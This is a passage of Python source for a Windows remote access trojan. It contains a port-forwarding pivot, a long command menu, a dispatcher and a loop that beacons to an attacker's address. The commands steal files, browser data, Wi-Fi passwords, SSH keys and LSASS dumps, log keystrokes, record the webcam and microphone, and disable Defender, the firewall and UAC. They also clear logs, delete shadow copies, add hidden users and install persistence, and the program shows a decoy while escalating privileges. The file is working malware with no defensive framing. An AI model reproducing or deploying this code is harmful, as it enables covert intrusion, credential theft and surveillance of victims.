    if key in _port_fwd_threads:
        return f"[-] Port {local_port} already in use"
    _stop = threading.Event()

    def _fwd(cs):
        try:
            rs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            rs.settimeout(10)
            rs.connect((remote_host, int(remote_port)))
            rs.settimeout(None)

            def relay(s, d):
                try:
                    while not _stop.is_set():
                        data = s.recv(4096)
                        if not data:
                            break
                        d.sendall(data)
                except:
                    pass
                finally:
                    try:
                        s.close()
                    except:
                        pass
                    try:
                        d.close()
                    except:
                        pass

            threading.Thread(target=relay, args=(cs, rs), daemon=True).start()
            threading.Thread(target=relay, args=(rs, cs), daemon=True).start()
        except:
            cs.close()

    def _listen():
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.settimeout(1)
        try:
            srv.bind(('0.0.0.0', int(local_port)))
            srv.listen(5)
            while not _stop.is_set():
                try:
                    c, _ = srv.accept()
                    threading.Thread(target=_fwd, args=(c,), daemon=True).start()
                except socket.timeout:
                    continue
        except:
            pass
        finally:
            srv.close()

    t = threading.Thread(target=_listen, daemon=True)
    t.start()
    _port_fwd_threads[key] = (_stop, t)
    return f"[+] Port forward: 0.0.0.0:{local_port} → {remote_host}:{remote_port}"

def stop_port_forward(p: str = "") -> str:
    """Stop one or all port forwards."""
    if p and p in _port_fwd_threads:
        _port_fwd_threads[p][0].set()
        del _port_fwd_threads[p]
        return f"[+] Forward {p} stopped"
    elif not p and _port_fwd_threads:
        for k in list(_port_fwd_threads):
            _port_fwd_threads[k][0].set()
            del _port_fwd_threads[k]
        return "[+] All forwards stopped"
    return "[-] No active forwards"

def list_port_forwards() -> str:
    """List active port forwards."""
    if not _port_fwd_threads:
        return "[-] No active forwards"
    return "[+] Active forwards:\n" + "\n".join(f"  - Port: {k}" for k in _port_fwd_threads)

# ===================== HELP =====================

HELP_TEXT = """
═══════════════════════════════════════════════════════════════
  AVAILABLE COMMANDS  v3.5 [ADMIN]
═══════════════════════════════════════════════════════════════

  NAVIGATION & FILES:
    cd <dir> / pwd / ls [dir] / tree [dir] [depth]
    download <file> / download_dir <dir> / upload <file>
    cat <file> / head <file> [n] / tail <file> [n]
    search <pattern> / grep <text> [path]
    file_info <path> / touch <file> / mkdir <dir> / rmdir <path>
    mv <src> <dst> / cp <src> <dst>
    write <file> <content> / append <file> <content>
    chattr <file> [YYYY-MM-DD HH:MM:SS]

  COLLECTION (return a file):
    steal / sysinfo / screenshot / browsers / exfil
    record_screen <sec> / record_mic <sec> / webcam_snap
    dump_lsass  (ADMIN) - Dump lsass.exe for Mimikatz
    scrloop <start [s]|stop|dump|clear>

  CREDENTIALS & SECRETS:
    wifi / credvault / find_secrets / ssh_keys / token_steal

  INFORMATION & RECON:
    status / quick_info / geolocate / proc_list / software
    net_scan [subnet] / port_scan <ip> [ports]
    dns_lookup <domain> / traceroute <host> / arp_table
    list_wifi / active_conn / netstat / privesc
    getenv [var] / disk_info / uptime / screen_res
    idle_time / timezone / recent_files / drivers
    startup_list / shares / whoami / hostname
    net_user [user] / net_group [group] / reg_query <path>

  APP CONTROL:
    kill_app / open_app / hide_app / show_app <name>

  DISRUPTION & TROLLING:
    lock_screen / change_wallpaper <path> / wallpaper_url <url>
    alert <msg> / msgbox <title>|<text>
    play_sound / set_volume <0-100> / tts <text>
    type_text <text> / open_url <url>
    swap_mouse / restore_mouse        Swap mouse buttons
    hide_taskbar / show_taskbar       Hide taskbar
    crazy_cursor [sec]                Crazy cursor (def: 10s)
    open_cd / close_cd                Open/close CD tray
    blue_screen  ☢️ (ADMIN) - Trigger BSOD

  CLIPBOARD:
    clipboard / clip_set <text> / clip_monitor <cmd>
    wipe_clipboard / hosts_edit <dom> <ip>

  PORT FORWARDING:
    port_fwd <lport> <rhost> <rport>   Pivot TCP traffic
    port_fwd_stop [lport]              Stop forwarding
    port_fwd_list                      List active forwards

  POWER CONTROL:
    battery / reboot / shutdown / logoff

  DOWNLOADS:
    download_url <url> [dest] / exec_remote <url>

  EVASION & BACKDOORS (ADMIN):
    disable_defender / disable_firewall / disable_uac
    clear_logs / exclude_path <path> / exclude_ext <ext>
    enable_rdp / add_user <u> <p> (hidden from login)
    disable_taskmgr / enable_taskmgr
    disable_cmd / enable_cmd
    shadow_list / shadow_delete

  CREDENTIALS (ADMIN):
    dump_hashes / dump_lsass

  PERSISTENCE:
    persist [all|registry|task|startup] / persist check|toggle|remove
    sys_persist  (ADMIN) - SYSTEM task at startup
    persist_wmi  (ADMIN) - Undetectable WMI persistence
    safe_mode_persist  (ADMIN) - Persist in Safe Mode

  KEYLOGGER:
    keylog start|stop|dump|clear

  CLEANUP:
    autodestroy / cleanup / ps <cmd> / exit / kill_shell
    <any command> → Execute in cmd

═══════════════════════════════════════════════════════════════
"""

# ===================== MAIN DISPATCH =====================
# Commands that generate a file (status_msg + FILE_START/data/FILE_END)
FILE_COMMANDS = {"steal", "sysinfo", "screenshot", "browsers", "exfil", "record_screen"}

def handle_command(sock: socket.socket, cmd: str) -> bool:
    """Process command and send response. Returns False to break connection."""
    if cmd == "exit":
        return False
    elif cmd == "kill_shell":
        sock.close()
        sys.exit(0)
    elif cmd == "help":
        send_encrypted(sock, HELP_TEXT)

    # --- Navigation ---
    elif cmd == "pwd":
        send_encrypted(sock, os.getcwd())
    elif cmd.startswith("cd "):
        try:
            os.chdir(cmd[3:].strip())
            send_encrypted(sock, f"[+] {os.getcwd()}")
        except Exception as e:
            send_encrypted(sock, f"[-] {e}")
    elif cmd == "ls":
        send_encrypted(sock, list_directory())
    elif cmd.startswith("ls "):
        send_encrypted(sock, list_directory(cmd[3:].strip()))

    # --- Files ---
    elif cmd.startswith("download "):
        fname = cmd[9:].strip()
        if not os.path.exists(fname):
            send_encrypted(sock, f"[-] Does not exist: {fname}")
        else:
            try:
                send_encrypted(sock, "FILE_START")
                with open(fname, 'rb') as f:
                    while True:
                        chunk = f.read(3 * 1024)
                        if not chunk:
                            break
                        send_encrypted(sock, base64.b64encode(chunk).decode('ascii'))
                send_encrypted(sock, "FILE_END")
            except:
                send_encrypted(sock, "FILE_END")
    elif cmd.startswith("upload "):
        fname = cmd[7:].strip()
        send_encrypted(sock, "READY_FOR_UPLOAD")
        try:
            with open(fname, 'wb') as f:
                while True:
                    line = recv_encrypted(sock)
                    if line is None or line == "FILE_END":
                        break
                    f.write(base64.b64decode(line))
            send_encrypted(sock, f"[+] {fname} saved ({os.path.getsize(fname)} bytes)")
        except Exception as e:
            send_encrypted(sock, f"[-] Error: {e}")

    # --- Collection (with file) ---
    elif cmd == "steal":
        result = steal_files()
        if os.path.exists(str(result)):
            send_encrypted(sock, "[+] Collecting user files...")
            send_file_over_socket(sock, result)
            safe_remove(result)
        else:
            send_encrypted(sock, str(result))
    elif cmd == "sysinfo":
        result = gather_sysinfo()
        if os.path.exists(str(result)):
            send_encrypted(sock, "[+] Gathering system information...")
            send_file_over_socket(sock, result)
            safe_remove(result)
        else:
            send_encrypted(sock, str(result))
    elif cmd == "screenshot":
        result = take_screenshot()
        if os.path.exists(str(result)):
            send_encrypted(sock, "[+] Capturing screen...")
            send_file_over_socket(sock, result)
            safe_remove(result)
        else:
            send_encrypted(sock, str(result))
    elif cmd == "browsers":
        result = steal_browsers()
        if os.path.exists(str(result)):
            send_encrypted(sock, "[+] Extracting browser data...")
            send_file_over_socket(sock, result)
            safe_remove(result)
        else:
            send_encrypted(sock, str(result))
    elif cmd == "exfil":
        result = full_exfil()
        if os.path.exists(str(result)):
            send_encrypted(sock, "[+] TOTAL exfiltration complete, sending...")
            send_file_over_socket(sock, result)
            safe_remove(result)
        else:
            send_encrypted(sock, str(result))
    elif cmd.startswith("record_screen "):
        result = record_screen(cmd.split(" ", 1)[1])
        if os.path.exists(str(result)):
            send_encrypted(sock, "[+] Screen recording complete, sending ZIP...")
            send_file_over_socket(sock, result)
            safe_remove(result)
        else:
            send_encrypted(sock, str(result))

    # --- Info (text) ---
    elif cmd == "status":
        send_encrypted(sock, get_system_status())
    elif cmd == "quick_info":
        send_encrypted(sock, quick_info())
    elif cmd == "geolocate":
        send_encrypted(sock, geolocate())
    elif cmd == "wifi":
        send_encrypted(sock, get_wifi_passwords())
    elif cmd == "list_wifi":
        send_encrypted(sock, list_wifi())
    elif cmd == "clipboard":
        send_encrypted(sock, get_clipboard())
    elif cmd.startswith("clip_monitor "):
        send_encrypted(sock, clipmon_control(cmd.split(" ", 1)[1].strip()))
    elif cmd == "software":
        send_encrypted(sock, get_installed_software())
    elif cmd == "privesc":
        send_encrypted(sock, check_privesc())

    # --- Persistence ---
    elif cmd in ("persist", "persist all"):
        send_encrypted(sock, install_persistence("all"))
    elif cmd == "persist check":
        send_encrypted(sock, check_persistence())
    elif cmd == "persist remove":
        send_encrypted(sock, remove_persistence())
    elif cmd == "persist toggle":
        send_encrypted(sock, toggle_persistence())
    elif cmd.startswith("persist "):
        send_encrypted(sock, install_persistence(cmd.split()[1] if len(cmd.split()) > 1 else "all"))

    # --- Keylogger ---
    elif cmd.startswith("keylog "):
        send_encrypted(sock, keylog_control(cmd[7:].strip()))
    elif cmd == "keylog":
        send_encrypted(sock, "[-] Usage: keylog start|stop|dump|clear")

    # --- Admin: Credentials ---
    elif cmd == "disable_defender":
        send_encrypted(sock, disable_defender())
    elif cmd == "dump_hashes":
        send_encrypted(sock, dump_hashes())
    elif cmd == "dump_lsass":
        result = dump_lsass()
        if os.path.exists(str(result)):
            send_encrypted(sock, "[+] lsass.dmp generated, sending...")
            send_file_over_socket(sock, result)
            safe_remove(result)
        else:
            send_encrypted(sock, str(result))

    # --- Admin: Backdoors ---
    elif cmd == "enable_rdp":
        send_encrypted(sock, enable_rdp())
    elif cmd.startswith("add_user "):
        parts = cmd[9:].strip().split(None, 1)
        if len(parts) == 2:
            send_encrypted(sock, add_user(parts[0], parts[1]))
        else:
            send_encrypted(sock, "[-] Usage: add_user <username> <password>")
    elif cmd == "disable_uac":
        send_encrypted(sock, disable_uac())
    elif cmd == "disable_firewall":
        send_encrypted(sock, disable_firewall())
    elif cmd == "clear_logs":
        send_encrypted(sock, clear_logs())
    elif cmd.startswith("exclude_path"):
        path = cmd[12:].strip() if len(cmd) > 12 else os.getcwd()
        send_encrypted(sock, exclude_path(path))
    elif cmd.startswith("exclude_ext "):
        send_encrypted(sock, exclude_ext(cmd[12:].strip()))
    elif cmd == "blue_screen":
        send_encrypted(sock, blue_screen())
    elif cmd == "disable_taskmgr":
        send_encrypted(sock, disable_taskmgr())
    elif cmd == "enable_taskmgr":
        send_encrypted(sock, enable_taskmgr())
    elif cmd == "disable_cmd":
        send_encrypted(sock, disable_cmd())
    elif cmd == "enable_cmd":
        send_encrypted(sock, enable_cmd())
    elif cmd == "shadow_list":
        send_encrypted(sock, shadow_copy_list())
    elif cmd == "shadow_delete":
        send_encrypted(sock, shadow_copy_delete())
    elif cmd == "safe_mode_persist":
        send_encrypted(sock, safe_mode_persist())

    # --- App Control ---
    elif cmd.startswith("kill_app "):
        send_encrypted(sock, kill_app(cmd[9:].strip()))
    elif cmd.startswith("open_app "):
        send_encrypted(sock, open_app(cmd[9:].strip()))
    elif cmd.startswith("hide_app "):
        send_encrypted(sock, hide_app(cmd[9:].strip()))
    elif cmd.startswith("show_app "):
        send_encrypted(sock, show_app(cmd[9:].strip()))

    # --- Disruption ---
    elif cmd == "lock_screen":
        send_encrypted(sock, lock_screen())
    elif cmd.startswith("change_wallpaper "):
        send_encrypted(sock, change_wallpaper(cmd[17:].strip()))

    # --- Recording / Espionage ---
    elif cmd.startswith("record_mic "):
        result = record_mic(cmd[11:].strip())
        if os.path.exists(str(result)):
            send_encrypted(sock, "[+] Recording complete, sending WAV...")
            send_file_over_socket(sock, result)
            safe_remove(result)
        else:
            send_encrypted(sock, str(result))
    elif cmd == "webcam_snap":
        result = webcam_snap()
        if os.path.exists(str(result)):
            send_encrypted(sock, "[+] Webcam photo captured, sending...")
            send_file_over_socket(sock, result)
            safe_remove(result)
        else:
            send_encrypted(sock, str(result))

    # --- Autodestroy ---
    elif cmd == "autodestroy":
        send_encrypted(sock, autodestroy())
        time.sleep(1)
        sock.close()
        sys.exit(0)

    # --- Power & Hardware ---
    elif cmd == "play_sound":
        send_encrypted(sock, play_sound())
    elif cmd.startswith("set_volume "):
        send_encrypted(sock, set_volume(cmd.split(" ", 1)[1].strip()))
    elif cmd == "battery":
        send_encrypted(sock, get_battery())
    elif cmd == "reboot":
        send_encrypted(sock, run_cmd("shutdown /r /f /t 0"))
    elif cmd == "shutdown":
        send_encrypted(sock, run_cmd("shutdown /s /f /t 0"))
    elif cmd == "logoff":
        send_encrypted(sock, logoff_user())

    # --- Utilities ---
    elif cmd.startswith("alert "):
        send_encrypted(sock, show_alert(cmd[6:].strip()))
    elif cmd.startswith("kill "):
        send_encrypted(sock, run_cmd(f"taskkill /IM {cmd[5:].strip()} /F"))
    elif cmd == "cleanup":
        send_encrypted(sock, cleanup())
    elif cmd.startswith("ps "):
        send_encrypted(sock, run_ps(cmd[3:].strip()))

    # --- Search & Files ---
    elif cmd.startswith("search "):
        send_encrypted(sock, search_files(cmd[7:].strip()))
    elif cmd.startswith("cat "):
        send_encrypted(sock, cat_file(cmd[4:].strip()))
    elif cmd.startswith("download_dir "):
        result = download_dir(cmd[13:].strip())
        if os.path.exists(str(result)):
            send_encrypted(sock, "[+] Directory compressed, sending ZIP...")
            send_file_over_socket(sock, result)
            safe_remove(result)
        else:
            send_encrypted(sock, str(result))

    # --- Credentials & Secrets ---
    elif cmd == "credvault":
        send_encrypted(sock, dump_credvault())
    elif cmd == "find_secrets":
        send_encrypted(sock, find_secrets())
    elif cmd == "ssh_keys":
        send_encrypted(sock, ssh_keys())
    elif cmd == "token_steal":
        send_encrypted(sock, token_steal())

    # --- Network Recon ---
    elif cmd.startswith("net_scan"):
        send_encrypted(sock, net_scan(cmd[8:].strip() if len(cmd) > 8 else ""))
    elif cmd.startswith("port_scan "):
        parts = cmd[10:].strip().split(None, 1)
        send_encrypted(sock, port_scan(parts[0] if parts else "", parts[1] if len(parts) > 1 else ""))
    elif cmd.startswith("dns_lookup "):
        send_encrypted(sock, dns_lookup(cmd[11:].strip()))
    elif cmd.startswith("traceroute "):
        send_encrypted(sock, traceroute(cmd[11:].strip()))
    elif cmd == "arp_table":
        send_encrypted(sock, arp_table())
    elif cmd == "active_conn":
        send_encrypted(sock, active_connections())
    elif cmd == "netstat":
        send_encrypted(sock, netstat_cmd())
    elif cmd.startswith("hosts_edit "):
        parts = cmd[11:].strip().split(None, 1)
        if len(parts) == 2:
            send_encrypted(sock, hosts_edit(parts[0], parts[1]))
        else:
            send_encrypted(sock, "[-] Usage: hosts_edit <domain> <ip>")

    # --- Processes & Env ---
    elif cmd == "proc_list":
        send_encrypted(sock, proc_list())
    elif cmd.startswith("getenv"):
        send_encrypted(sock, getenv(cmd[6:].strip()))

    # --- Extended Clipboard ---
    elif cmd.startswith("clip_set "):
        send_encrypted(sock, clip_set(cmd[9:].strip()))
    elif cmd == "wipe_clipboard":
        send_encrypted(sock, wipe_clipboard())

    # --- Screenshot Loop ---
    elif cmd.startswith("scrloop "):
        parts = cmd[8:].strip().split(None, 1)
        action = parts[0] if parts else ""
        interval = parts[1] if len(parts) > 1 else "5"
        if action == "dump":
            result = scrloop_control("dump")
            if os.path.exists(str(result)):
                send_encrypted(sock, f"[+] Sending {os.path.basename(result)}...")
                send_file_over_socket(sock, result)
                safe_remove(result)
            else:
                send_encrypted(sock, str(result))
        else:
            send_encrypted(sock, scrloop_control(action, interval))

    # --- Advanced Persistence (ADMIN) ---
    elif cmd == "sys_persist":
        send_encrypted(sock, sys_persist())
    elif cmd == "persist_wmi":
        send_encrypted(sock, persist_wmi())
    elif cmd == "safe_mode_persist":
        send_encrypted(sock, safe_mode_persist())

    # --- New v3.0 Commands ---
    elif cmd == "disk_info":
        send_encrypted(sock, disk_info())
    elif cmd == "uptime":
        send_encrypted(sock, get_uptime())
    elif cmd.startswith("open_url "):
        send_encrypted(sock, open_url(cmd[9:].strip()))
    elif cmd.startswith("type_text "):
        send_encrypted(sock, type_text(cmd[10:].strip()))
    elif cmd.startswith("msgbox "):
        parts = cmd[7:].strip().split('|', 1)
        send_encrypted(sock, msgbox(parts[0].strip(), parts[1].strip()) if len(parts) == 2 else msgbox("System", parts[0].strip()))
    elif cmd.startswith("tts "):
        send_encrypted(sock, tts_speak(cmd[4:].strip()))
    elif cmd == "startup_list":
        send_encrypted(sock, startup_list())
    elif cmd == "shares":
        send_encrypted(sock, list_shares())
    elif cmd.startswith("download_url "):
        parts = cmd[13:].strip().split(None, 1)
        send_encrypted(sock, download_url(parts[0] if parts else "", parts[1] if len(parts) > 1 else ""))
    elif cmd.startswith("exec_remote "):
        send_encrypted(sock, exec_remote(cmd[12:].strip()))
    elif cmd.startswith("file_info "):
        send_encrypted(sock, file_info(cmd[10:].strip()))
    elif cmd.startswith("touch "):
        send_encrypted(sock, touch_file(cmd[6:].strip()))
    elif cmd.startswith("mkdir "):
        send_encrypted(sock, make_dir(cmd[6:].strip()))
    elif cmd.startswith("rmdir "):
        send_encrypted(sock, remove_dir(cmd[6:].strip()))
    elif cmd.startswith("mv "):
        parts = cmd[3:].strip().split(None, 1)
        send_encrypted(sock, move_file(parts[0], parts[1]) if len(parts) == 2 else "[-] Usage: mv <src> <dst>")
    elif cmd.startswith("cp "):
        parts = cmd[3:].strip().split(None, 1)
        send_encrypted(sock, copy_file(parts[0], parts[1]) if len(parts) == 2 else "[-] Usage: cp <src> <dst>")
    elif cmd == "whoami":
        send_encrypted(sock, whoami())
    elif cmd == "hostname":
        send_encrypted(sock, hostname_cmd())
    elif cmd == "screen_res":
        send_encrypted(sock, screen_res())
    elif cmd == "idle_time":
        send_encrypted(sock, idle_time())
    elif cmd == "timezone":
        send_encrypted(sock, get_timezone())
    elif cmd == "recent_files":
        send_encrypted(sock, recent_files())
    elif cmd == "drivers":
        send_encrypted(sock, list_drivers())
    elif cmd.startswith("grep "):
        parts = cmd[5:].strip().split(None, 1)
        send_encrypted(sock, grep_files(parts[0] if parts else "", parts[1] if len(parts) > 1 else "."))
    elif cmd.startswith("reg_query "):
        send_encrypted(sock, reg_query(cmd[10:].strip()))
    elif cmd.startswith("net_user"):
        send_encrypted(sock, net_user_detail(cmd[8:].strip()))
    elif cmd.startswith("net_group"):
        send_encrypted(sock, net_localgroup(cmd[9:].strip()))
    elif cmd.startswith("tail "):
        parts = cmd[5:].strip().split(None, 1)
        send_encrypted(sock, tail_file(parts[0] if parts else "", parts[1] if len(parts) > 1 else "20"))
    elif cmd.startswith("head "):
        parts = cmd[5:].strip().split(None, 1)
        send_encrypted(sock, head_file(parts[0] if parts else "", parts[1] if len(parts) > 1 else "20"))
    elif cmd.startswith("write "):
        parts = cmd[6:].strip().split(None, 1)
        send_encrypted(sock, write_file(parts[0], parts[1]) if len(parts) == 2 else "[-] Usage: write <file> <content>")
    elif cmd.startswith("append "):
        parts = cmd[7:].strip().split(None, 1)
        send_encrypted(sock, append_file(parts[0], parts[1]) if len(parts) == 2 else "[-] Usage: append <file> <content>")
    elif cmd.startswith("tree"):
        parts = cmd[4:].strip().split(None, 1)
        path = parts[0] if parts else "."
        try:
            depth = int(parts[1]) if len(parts) > 1 else 3
        except:
            depth = 3
        send_encrypted(sock, tree_dir(path, depth))
    elif cmd.startswith("chattr "):
        parts = cmd[7:].strip().split(None, 1)
        send_encrypted(sock, change_timestamp(parts[0] if parts else "", parts[1] if len(parts) > 1 else ""))

    # --- Trolling Extras ---
    elif cmd == "swap_mouse":
        send_encrypted(sock, swap_mouse(True))
    elif cmd == "restore_mouse":
        send_encrypted(sock, swap_mouse(False))
    elif cmd == "hide_taskbar":
        send_encrypted(sock, hide_taskbar())
    elif cmd == "show_taskbar":
        send_encrypted(sock, show_taskbar())
    elif cmd.startswith("crazy_cursor"):
        parts = cmd.split()
        secs = int(parts[1]) if len(parts) > 1 else 10
        send_encrypted(sock, crazy_cursor(secs))
    elif cmd == "open_cd":
        send_encrypted(sock, open_cd())
    elif cmd == "close_cd":
        send_encrypted(sock, close_cd())
    elif cmd.startswith("wallpaper_url "):
        send_encrypted(sock, wallpaper_url(cmd[14:].strip()))

    # --- Port Forwarding ---
    elif cmd.startswith("port_fwd_stop"):
        send_encrypted(sock, stop_port_forward(cmd.split()[1] if len(cmd.split()) > 1 else ""))
    elif cmd == "port_fwd_list":
        send_encrypted(sock, list_port_forwards())
    elif cmd.startswith("port_fwd "):
        parts = cmd[9:].strip().split()
        send_encrypted(sock, start_port_forward(parts[0], parts[1], parts[2]) if len(parts) == 3 else "[-] Usage: port_fwd <lport> <rhost> <rport>")

    # --- Generic Command ---
    else:
        send_encrypted(sock, run_cmd(cmd))

    return True

# ===================== CONNECTION LOOP =====================

def connect_and_loop():
    """Infinite loop that connects to the listener, processes commands, and reconnects on failure."""
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ATTACKER_IP, ATTACKER_PORT))
            vm_tag = ""
            send_encrypted(s, f"[+] Connected: {getpass.getuser()}@{socket.gethostname()} ({'ADMIN' if is_admin() else 'user'}) in {os.getcwd()} [v3.5-ADMIN]{vm_tag}")

            while True:
                cmd = recv_encrypted(s)
                if cmd is None:
                    break
                cmd = cmd.strip()
                if not cmd:
                    continue
                if not handle_command(s, cmd):
                    break

            s.close()
        except (socket.error, ConnectionRefusedError, ConnectionResetError):
            pass
        except KeyboardInterrupt:
            break
        except Exception:
            pass
        finally:
            try:
                s.close()
            except:
                pass
            if _persist_active and (not os.path.exists(PERSIST_SCRIPT) or os.path.realpath(__file__) != os.path.realpath(PERSIST_SCRIPT)):
                install_persistence()
        # Beacon jitter: randomized reconnect delay
        if BEACON_JITTER:
            delay = random.uniform(BEACON_MIN, BEACON_MAX)
        else:
            delay = RECONNECT_DELAY
        time.sleep(delay)

if __name__ == "__main__":
    # If not running as admin, attempt to elevate and show decoy
    if not is_admin():
        if not os.path.exists(PERSIST_SCRIPT) or os.path.realpath(__file__) != os.path.realpath(PERSIST_SCRIPT):
            launch_decoy()
        run_as_admin()
    # Install persistence if not already persistent
    if not os.path.exists(PERSIST_SCRIPT) or os.path.realpath(__file__) != os.path.realpath(PERSIST_SCRIPT):
        install_persistence()
    connect_and_loop()
